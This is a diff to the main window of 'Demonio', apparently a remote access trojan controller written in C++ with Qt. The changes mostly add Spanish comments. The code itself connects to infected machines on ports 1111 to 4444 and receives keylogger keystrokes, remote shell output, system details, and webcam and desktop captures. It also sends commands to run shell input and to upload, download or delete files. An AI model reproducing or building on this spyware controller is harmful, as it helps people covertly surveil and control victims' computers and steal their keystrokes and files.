@@ -31,6 +31,7 @@ MainWindow::MainWindow ( QWidget *parent ) :
   ventana.activo = 0;
   esconderFrames();
   ui->frameConexion->show();
+  // Poner los iconos a la lista de opciones
   QIcon icono;
   icono.addFile("./icons/demonio.png");
   this->setWindowIcon(icono);
@@ -54,10 +55,8 @@ MainWindow::MainWindow ( QWidget *parent ) :
   ui->listaOpciones->item(8)->setIcon(icono);
   icono.addFile("./icons/im-user.png");
   ui->listaOpciones->item(9)->setIcon(icono);
-  /*ui->listaOpciones->item(8)->icon();
-  ui->listaOpciones->item(9)->icon();
-  ui->listaOpciones->item()->icon();*/
 
+  //Ordenar los frmase en un Layout, frames a la derecha y menu de opciones a la izquierda
   layoutPrincipal = new QGridLayout ( ui->centralWidget );
   layoutPrincipal->addWidget ( ui->listaOpciones );
   layoutPrincipal->addWidget ( ui->frameConexion,0,1 );
@@ -75,7 +74,8 @@ MainWindow::MainWindow ( QWidget *parent ) :
   layoutPrincipal->setColumnStretch ( 0,100 );
   ui->gridLayout->setColumnStretch ( 0,1 );
   ui->gridLayout->setColumnStretch ( 2,900 );
-  //ui->layoutPrincipal->addWidget(ui->frameLista,0,0);
+
+  //conexiones de signals y slots
   connect ( ui->servidoresLista,SIGNAL ( itemClicked ( QListWidgetItem* ) ),this,SLOT ( seleccionarServidor() ) );
   connect ( ui->botonEscuchar,SIGNAL ( clicked() ),this,SLOT ( escuchar() ) );
   connect ( ui->botonCerrarServidor,SIGNAL ( clicked() ),this,SLOT ( cerrarServidor() ) );
@@ -130,6 +130,7 @@ MainWindow::~MainWindow()
 }
 void MainWindow::changeEvent ( QEvent *e )
 {
+  /** En esta funcion vemos cuando llega el evento LanguageChange y retraducimos la interfaz **/
   QMainWindow::changeEvent ( e );
   switch ( e->type() )
     {
@@ -142,6 +143,7 @@ void MainWindow::changeEvent ( QEvent *e )
 }
 bool MainWindow::event(QEvent *event)
 {
+    /** Esta funcion maneja los eventos que llegan a la ventana principal **/
     switch ( event->type() )
     {
     case QEvent::Show:
@@ -157,6 +159,7 @@ bool MainWindow::event(QEvent *event)
 }
 void MainWindow::esconderFrames()
 {
+  /** Esta funcion esconde todos los frames **/
   ui->frameConexion->hide();
   ui->frameInformacion->hide();
   ui->frameShellRemota->hide();
@@ -170,6 +173,7 @@ void MainWindow::esconderFrames()
 }
 void MainWindow::listaOpciones()
 {
+  /** Esta funcion es llamada cuando selecionamos algun Item de la lista de opciones **/
   int opcion = ui->listaOpciones->currentIndex().row();
   esconderFrames();
   switch ( opcion )
@@ -232,10 +236,12 @@ void MainWindow::listaOpciones()
 
 void MainWindow::showAboutQt()
 {
+  /** Muestra informacion sobre Qt **/
   QApplication::aboutQt();
 }
 void MainWindow::licencia()
 {
+  /** Muestra la licencia **/
   QFile licencia;
   licencia.setFileName ( "./rc/gpl-3.0.txt" );
   licencia.open ( QIODevice::ReadOnly );
@@ -246,14 +252,17 @@ void MainWindow::licencia()
 }
 void MainWindow::about()
 {
+  /** Muestra informacion sobre Demonio **/
   util.ventanaEmergente(tr("Demonio 1.0 SVN<br>Programado por: Alberto Pajuelo Montes<br>Email: paju1986@gmail.com<br>Web: <a href=\"http://sourceforge.net/projects/demonio/\">http://sourceforge.net/projects/demonio/</a>"));
 }
 void MainWindow::opcionesServidor()
 {
+    /** abre la ventana de opciones del servidor **/
     opciones.show();
 }
 void MainWindow::opcionesVentanaPuertos()
 {
+    /** abre la ventana  de configuracion de puertos del cliente **/
     opcionesPuertos.show();
 }
 void MainWindow::escuchar()
@@ -273,7 +282,7 @@ void MainWindow::escuchar()
   connect ( &serverEscritorio,SIGNAL ( newConnection() ),this,SLOT ( nuevaConexionEscritorio() ) );
   connect ( &serverEscritorio,SIGNAL ( newConnection() ),this,SLOT ( nuevaConexionWebcam() ) );
   connect ( &mapa,SIGNAL ( mapped ( int ) ),this,SLOT ( desconectado ( int ) ) );
-  if ( server.isListening() && serverArchivos.isListening() && serverEscritorio.isListening() && serverWebcam.isListening())
+  if ( server.isListening() && serverArchivos.isListening() && serverEscritorio.isListening() && serverWebcam.isListening()) //Si todos los sockets estan escuchando lo notificamos en un mensaje
     {
       ui->notificacionLabel->setText ( "Escuchando" );
       ui->botonEscuchar->setEnabled(false);
@@ -292,17 +301,20 @@ void MainWindow::nuevaConexion()
 }
 void MainWindow::nuevaConexionArchivos()
 {
+    /** Esta funcion se ejecuta cuando se establece una nueva conexion del socket de Archivos **/
   ventana.socketArchivos[ventana.conexiones] = serverArchivos.nextPendingConnection();
   ventana.conexiones++;
 }
 void MainWindow::nuevaConexionEscritorio()
 {
+    /** Esta funcion se ejecuta cuando se establece una nueva conexion del socket de capturas de escritorio **/
   escritorio.socketEscritorio[escritorio.conexiones] = serverEscritorio.nextPendingConnection();
   escritorio.conexiones++;
 }
 
 void MainWindow::nuevaConexionWebcam()
 {
+    /** Esta funcion se ejecuta cuando se establece una nueva conexion del socket de capturas de webcam **/
     webcam.socketWebcam[webcam.conexiones] = serverWebcam.nextPendingConnection();
     webcam.conexiones++;
 }
@@ -310,17 +322,19 @@ void MainWindow::conectarDemoxy()
 {
     /** sistema de conexión Demoxy **/
     ui->botonEscuchar->setEnabled(false); //No puede estar conectado a demoxy y escuchando conexiones a la vez (Por ahora)
-    activo = 0;
+    activo = 0; //Utilizamos el socket 0 para conectar a Demoxy
     socket[activo] = new QTcpSocket(this);
     ventana.socketArchivos[activo] = new QTcpSocket(this);
     escritorio.socketEscritorio[activo] = new QTcpSocket(this);
     webcam.socketWebcam[activo] = new QTcpSocket(this);
     QString host = QInputDialog::getText ( &ventana,"Host","Introduce la dirección del host" );
+    //Realizamos la conexion en los puertos 1111,2222,3333,4444
     socket[activo]->connectToHost(host,1111);
     ventana.socketArchivos[activo]->connectToHost(host,2222);
     escritorio.socketEscritorio[activo]->connectToHost(host,3333);
     webcam.socketWebcam[activo]->connectToHost(host,4444);
     connect ( socket[activo],SIGNAL ( readyRead() ),this,SLOT ( llegadaDatos() ) );
+    //Notificamos si cada socket esta correctamente conectado
     if( ventana.socketArchivos[activo]->state() == QAbstractSocket::ConnectedState )
     {
       ui->notificacionLabel->setText("socket principal conectado a Demoxy");
@@ -335,55 +349,52 @@ void MainWindow::conectarDemoxy()
     }
 }
 
-void MainWindow::llegadaDatos() /** llegada de datos; **/
+void MainWindow::llegadaDatos()
 {
-  QString datos = socket[activo]->readAll();
-  QStringList parametros = datos.split ( "|@|" );
+  /** Esta funcion se ejecuta cuando llegan datos del socket principal **/
+  QString datos = socket[activo]->readAll(); //Leemos los datos
+  QStringList parametros = datos.split ( "|@|" ); //Separamos los parametros por |@|
   if( parametros[0] == "conectado") //Si la conexión proviene a traves de Demoxy
   {
     ui->servidoresLista->addItem("Servidor Demoxy");
   }
-  if( datos == "pong")
+  if( datos == "pong") //Si recibe respuesta de un ping
   {
     util.ventanaEmergente("responde");
   }
-  if ( parametros[0] == "shell" )
+  if ( parametros[0] == "shell" ) //Si llegan datos de una shell remota
     {
       ui->salidaTexto->setText ( parametros[1] );
     }
-  if ( parametros[0] == "home" )
+  if ( parametros[0] == "home" ) //Si llega la ruta del directorio home
     {
       ventana.establecerRuta ( parametros[1] );
       util.escribirSocket ( "archivos|@|" + parametros[1],socket[activo] );
     }
-  if (parametros[0] == "unidades")
+  if (parametros[0] == "unidades") //Si llega la lista de unidades
   {
     ventana.comboUnidad()->clear();
     ponerUnidades(parametros);
   }
-  if ( parametros[0] == "file" )
+  if ( parametros[0] == "file" ) //Si llega la lista de ficheros
     {
       ponerArchivos ( parametros );
       util.escribirSocket ( "directorios|@|" + ventana.ruta,socket[activo] );
     }
-  if ( parametros[0] == "folder" )
+  if ( parametros[0] == "folder" ) //si llega la lista de archivos
     {
       ponerDirectorios ( parametros );
     }
-  if (parametros[0] == "chat") {
+  if (parametros[0] == "chat") { //Si llegan mensajes del chat
       this->ponerMensajeChat(parametros[1],ui->textoNickServidor->text());
   }
-  if (parametros[0] == "resolucion")
-  {
-    escritorio.alto = parametros[1].toInt();
-    escritorio.ancho = parametros[2].toInt();
-  }
-  if (parametros[0] == "teclas")
+  if (parametros[0] == "teclas") //Si llegan teclas del keylogger
   {
     ui->textTeclas->setText(parametros[1]);
   }  
-  if (parametros[0] == "informacion")
+  if (parametros[0] == "informacion") //Si llega informacion del sistema
   {
+    //Ponemos cada parametro en su respectiva variable
     QString informacion;
     QString so = parametros[1];
     QString version = parametros[2];
@@ -394,6 +405,7 @@ void MainWindow::llegadaDatos() /** llegada de datos; **/
     QString fecha = parametros[7];
     QString hora = parametros[8];
     this->alias = parametros[9];
+    //Mostramos la informacion en pantalla
     informacion = "Sistema operativo: " + so + "<br>";
     informacion = informacion + "Versi&oacute;n: " + version +"<br>";
     informacion = informacion + "Directorio del usuario: " + homePath + "<br>";
@@ -402,6 +414,7 @@ void MainWindow::llegadaDatos() /** llegada de datos; **/
     informacion = informacion + "Fecha del sistema: " + fecha + "<br>";
     informacion = informacion + "Hora del sistema: " + hora + "<br>";
     ui->informacionSistemaTexto->setHtml(informacion);
+    //La resolucion tambien la ponemos en el titulo de la ventana de captura de pantalla
     this->setWindowTitle("Demonio - Cliente - Conectado a: " + this->alias);
     util.escribirSocket("unidades|@|",socket[activo]);
   }
@@ -410,6 +423,7 @@ void MainWindow::seleccionarServidor()
 {
   /** se utiliza el indice de la lista para salecionar un socket del array y desbloquearle las señales **/
   socket[activo]->blockSignals ( true );
+  //El socket activo sera el mismo que el del indice elegido en la lista de servidores conectados
   activo = ui->servidoresLista->currentIndex().row();
   ventana.activo = activo;
   escritorio.activo = activo;
@@ -455,6 +469,7 @@ void MainWindow::desconectado ( int indice )
       ventana.socketArchivos[j] = ventana.socketArchivos[j + 1];
       escritorio.socketEscritorio[j] = escritorio.socketEscritorio[j + 1];
     }
+  //Disminuimos los contadores de conexiones
   conexiones--;
   ventana.conexiones--;
   escritorio.conexiones--;
@@ -462,34 +477,41 @@ void MainWindow::desconectado ( int indice )
 }
 void MainWindow::shellEnviar()
 {
+  /**Esta funcion envia datos a una shell remota **/
   QString datos = "shell|@|" + ui->entradaTexto->text();
   util.escribirSocket ( datos,socket[activo] );
 }
 void MainWindow::reinciar()
 {
+  /** Esta funcion envia la orden de reiniciar el servidor **/
   util.escribirSocket ( "reiniciar",socket[activo] );
 }
 void MainWindow::desinfectar()
 {
+  /** Esta funcion envia la orden de desinfectar el sistema **/
   util.escribirSocket ( "desinfectar",socket[activo] );
 }
 void MainWindow::abrirVentanaArchivos()
 {
+  /** Abre la ventana del administrador de archivos **/
   ventana.limpiarArchivos();
   ventana.show();
 }
 void MainWindow::abrirVentanaWebcam()
 {
+    /** Abre la ventana de las capturas de webcam **/
     this->webcam.show();
 }
 void MainWindow::cambioComboUnidad()
 {
+    /** Esta funcion se ejecuta cuando se elije una unidad en el administrador de archivos **/
     ventana.limpiarArchivos();
     ventana.establecerRuta ( ventana.comboUnidad()->currentText() );
     util.escribirSocket ( "archivos|@|" + ventana.ruta,socket[activo] );
 }
 void MainWindow::ponerUnidades(QStringList unidades)
 {
+    /**Pone las unidades pasadas como parametros en el combo de unidades **/
     int i;
     for ( i=1;i<unidades.size() -1;i++ )
       {
@@ -498,6 +520,7 @@ void MainWindow::ponerUnidades(QStringList unidades)
 }
 void MainWindow::ponerArchivos ( QStringList archivos )
 {
+  /** pone los archivos pasados como parametro en lista de archivos del administrador de archivos **/
   int i;
   for ( i=1;i<archivos.size() -1;i++ )
     {
@@ -506,6 +529,7 @@ void MainWindow::ponerArchivos ( QStringList archivos )
 }
 void MainWindow::ponerDirectorios ( QStringList directorios )
 {
+  /** pone los directorios pasados como parametros en la lista de directorios del administrador de archivos **/
   int i;
   for ( i=2;i<directorios.size() -1;i++ )
     {
@@ -514,8 +538,9 @@ void MainWindow::ponerDirectorios ( QStringList directorios )
 }
 void MainWindow::directorioCambio()
 {
+  /**Esta funcion se ejecuta cuando se seleciona un directorio en la lista de directorios del administrador de archivos **/
   QString nuevoDirectorio = ventana.directoriosLista()->currentItem()->text();
-  if ( nuevoDirectorio == ".." )
+  if ( nuevoDirectorio == ".." ) //Si el directorio es .. significa volver atras
     {
       ventana.rutaAnterior = util.obtenerRutaAnterior ( ventana.ruta );
       ventana.establecerRuta ( ventana.rutaAnterior );
@@ -532,12 +557,14 @@ void MainWindow::directorioCambio()
 }
 void MainWindow::archivosIr()
 {
+  /** Esta funcion envia la ruta a la que queremos navegar en el administrador de archivos **/
   ventana.limpiarArchivos();
   ventana.establecerRuta ( ventana.rutaTexto()->text() );
   util.escribirSocket ( "archivos|@|" + ventana.ruta,socket[activo] );
 }
 void MainWindow::archivosAtras()
 {
+  /** Envia la ruta anterios a la que estabamos **/
   ventana.rutaAnterior = util.obtenerRutaAnterior ( ventana.ruta );
   ventana.establecerRuta ( ventana.rutaAnterior );
   ventana.limpiarArchivos();
@@ -545,16 +572,19 @@ void MainWindow::archivosAtras()
 }
 void MainWindow::archivosHome()
 {
+  /** pide recibir la ruta del directorio home **/
   ventana.limpiarArchivos();
   util.escribirSocket ( "home",socket[activo] );
 }
 void MainWindow::archivosRefresco()
 {
+  /** refresca la vista de archivos **/
   ventana.limpiarArchivos();
   util.escribirSocket ( "archivos|@|" + ventana.ruta,socket[activo] );
 }
 void MainWindow::archivosDescargar()
 {
+    /** Manda descargar un archivo **/
     if( ventana.archivosLista()->currentRow() >= 0) {
         QFileDialog dialogo;
         QString dir;
@@ -567,6 +597,7 @@ void MainWindow::archivosDescargar()
 }
 void MainWindow::archivosSubir()
 {
+  /** Manda subir un archivo **/
   QFileDialog archivo;
   QString nombreArchivo = archivo.getOpenFileName ( this,"Abrir archivo",QDir::homePath() );
   QStringList cachosArchivo = nombreArchivo.split ( "/" );
@@ -574,8 +605,10 @@ void MainWindow::archivosSubir()
   ventana.subirArchivo ( nombreArchivo );
 }
 
-void MainWindow::archivosBorrar()
-{   if( ventana.archivosLista()->currentRow() >= 0) {
+void MainWindow::archivosBorrar()        
+{
+    /** Manda borrar un archivo **/
+    if( ventana.archivosLista()->currentRow() >= 0) {
         QString rutaArchivo = ventana.ruta + "/" + ventana.archivosLista()->currentItem()->text();
         util.escribirSocket ( "remove|@|" + rutaArchivo,socket[activo] );
     }
